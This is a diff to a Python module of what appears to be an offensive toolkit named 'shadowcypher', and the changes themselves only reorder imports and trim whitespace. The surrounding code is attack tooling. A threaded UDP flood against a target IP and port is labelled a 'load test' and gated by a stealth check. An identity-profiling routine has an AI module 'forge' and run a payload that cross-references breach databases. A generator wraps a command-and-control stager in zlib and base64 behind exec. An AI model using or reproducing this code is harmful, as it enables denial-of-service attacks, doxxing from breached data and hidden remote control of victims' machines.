@@ -4,13 +4,14 @@ Supports: UDP_FLUX, HTTP_SYN_FLOOD, ICMP_BURST.
 """
 
 import os
-import socket
 import random
+import socket
 import threading
 import time
-import logging
+
 from shadowcypher.core.logger import logger
 from shadowcypher.core.stealth import require_stealth
+
 
 class ChaosOrchestrator:
     def __init__(self):
@@ -22,7 +23,7 @@ class ChaosOrchestrator:
         require_stealth(on_output=on_output)
         self.active = True
         logger.info("chaos", f"LOAD_TEST: Initiating UDP volumetric test on {target_ip}:{target_port}")
-        
+
         def flood():
             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             end_time = time.time() + duration
@@ -34,7 +35,7 @@ class ChaosOrchestrator:
                         time.sleep(0.01) # Jitter
                 except Exception:
                     pass
-        
+
         for _ in range(threads):
             t = threading.Thread(target=flood, daemon=True)
             t.start()
@@ -43,34 +44,35 @@ class ChaosOrchestrator:
     def asset_correlation(self, identity, on_output=None):
         """AI-Driven personality profiling and asset correlation."""
         from shadowcypher.modules.deephat import deephat
-        
+
         desc = f"Deep-correlate identity {identity}. Cross-reference with known breach databases. Output risk matrix."
         if on_output:
             on_output(f"[OSINT] CORRELATING_ASSETS: Synthesizing data profile for {identity}...\n")
-        
+
         filename = deephat.forge_weapon(desc, category="asset_correlation")
         return deephat.execute_payload(filename, on_output=on_output)
 
     def generate_encoded_stager(self, lhost, lport, on_output=None):
         """Generate a Python stager wrapped in zlib and base64 encoding."""
-        import zlib
         import base64
+        import zlib
+
         from shadowcypher.modules.craft_factory import CraftFactory
         if on_output:
             on_output("[PAYLOAD] GENERATING_ENCODED_STAGER...\n")
-        
+
         path = CraftFactory.generate_stealth_c2_python(lhost, lport)
         with open(path, "rb") as f:
             original = f.read()
-            
+
         # Recursive encoding wrapper
         b64_data = base64.b64encode(zlib.compress(original)).decode()
         wrapper = f"import zlib,base64; exec(zlib.decompress(base64.b64decode('{b64_data}')))"
-        
+
         encoded_path = path.replace(".py", "_encoded.py")
         with open(encoded_path, "w") as f:
             f.write(wrapper)
-            
+
         if on_output:
             on_output(f"[SUCCESS] STAGER_GENERATED: {encoded_path}\n")
         return encoded_path
